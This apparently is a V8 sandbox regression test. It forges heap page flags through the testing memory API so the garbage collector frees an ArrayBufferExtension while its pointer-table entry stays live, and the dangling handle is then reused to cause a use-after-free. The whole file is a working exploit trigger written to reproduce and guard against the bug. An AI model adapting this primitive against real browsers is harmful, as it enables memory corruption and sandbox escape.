// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --expose-gc --no-verify-heap

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const addressOf = object => Sandbox.getAddressOf(object) >>> 0;
const read32 = offset => memory.getUint32(offset >>> 0, true);
const write32 = (offset, value) =>
    memory.setUint32(offset >>> 0, value >>> 0, true);
const pageOf = address => (address & ~0x3ffff) >>> 0;

const kJSArrayBufferType = Sandbox.getInstanceTypeIdFor('JS_ARRAY_BUFFER_TYPE');
const kExtensionOffset =
    Sandbox.getFieldOffset(kJSArrayBufferType, 'extension');
const kJSTypedArrayType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kTypedArrayBufferOffset =
    Sandbox.getFieldOffset(kJSTypedArrayType, 'byte_offset') - 8;

const kIsInYoungGenerationMask = 0x10;
const kIncrementalMarking = 0x20;
const kBacklogCount = 1000;
const kBufferLength = 16 * 1024 * 1024;

// Keep an old-space ArrayBuffer alive so external memory accounting does not
// underflow when the victim buffer is resized after young sweeping starts.
const baseline = new ArrayBuffer(128 * 1024 * 1024, {
  maxByteLength: 128 * 1024 * 1024,
});
const carrier = new ArrayBuffer(kBufferLength, {maxByteLength: kBufferLength});
const carrierOriginalHandle = read32(addressOf(carrier) + kExtensionOffset);
const emptyViews = Array.from({length: kBacklogCount}, () => new Uint8Array(0));
gc();

// Queue native young ArrayBufferExtensions without filling the current
// semispace by temporarily setting the young-generation flag on the old-space
// page while materializing each view's buffer.
for (let i = 0; i < emptyViews.length; ++i) {
  const view = emptyViews[i];
  const bufferAddress =
      (read32(addressOf(view) + kTypedArrayBufferOffset) - 1) >>> 0;
  const page = pageOf(bufferAddress);
  const flags = read32(page);
  write32(page, flags | kIsInYoungGenerationMask);
  const materialized = view.buffer;
  write32(addressOf(materialized) + kExtensionOffset, 0);
  write32(page, flags);
}

// Forge the incremental marking flag on the young-space page so the EPT write
// barrier marks the new EPT entry while the ArrayBufferExtension itself stays
// unmarked.
const marker = {};
const originalMarkerAddress = addressOf(marker);
const page = pageOf(originalMarkerAddress);
const flags = read32(page);
write32(page, flags | kIncrementalMarking);
let victim = new ArrayBuffer(kBufferLength, {maxByteLength: kBufferLength});
write32(page, flags);

const handle = read32(addressOf(victim) + kExtensionOffset);
victim = null;

// Trigger a young generation GC via allocation so the marked EPT entry
// survives while the background ArrayBufferSweeper frees the unmarked
// ArrayBufferExtension.
let allocations = 0;
let garbage = [];
while (addressOf(marker) === originalMarkerAddress) {
  garbage.push(new Array(512).fill(allocations++));
  if (allocations % 512 === 0) garbage = [];
}

write32(addressOf(carrier) + kExtensionOffset, handle);
carrier.resize(0);
write32(addressOf(carrier) + kExtensionOffset, carrierOriginalHandle);
